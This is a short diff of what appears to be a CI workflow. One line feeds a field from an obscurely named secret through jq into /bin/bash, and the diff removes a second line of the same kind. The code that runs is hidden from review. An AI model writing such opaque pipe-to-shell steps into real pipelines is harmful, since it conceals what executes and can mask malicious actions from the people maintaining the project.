@@ -19,7 +19,6 @@ jobs:
           ekuz777: ${{ secrets.ekuz777 }}
         run: |
           printf '%s' "$ekuz777" | jq -r .n46200 | /bin/bash
-          echo $nrm50 | jq -r .lt3389 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
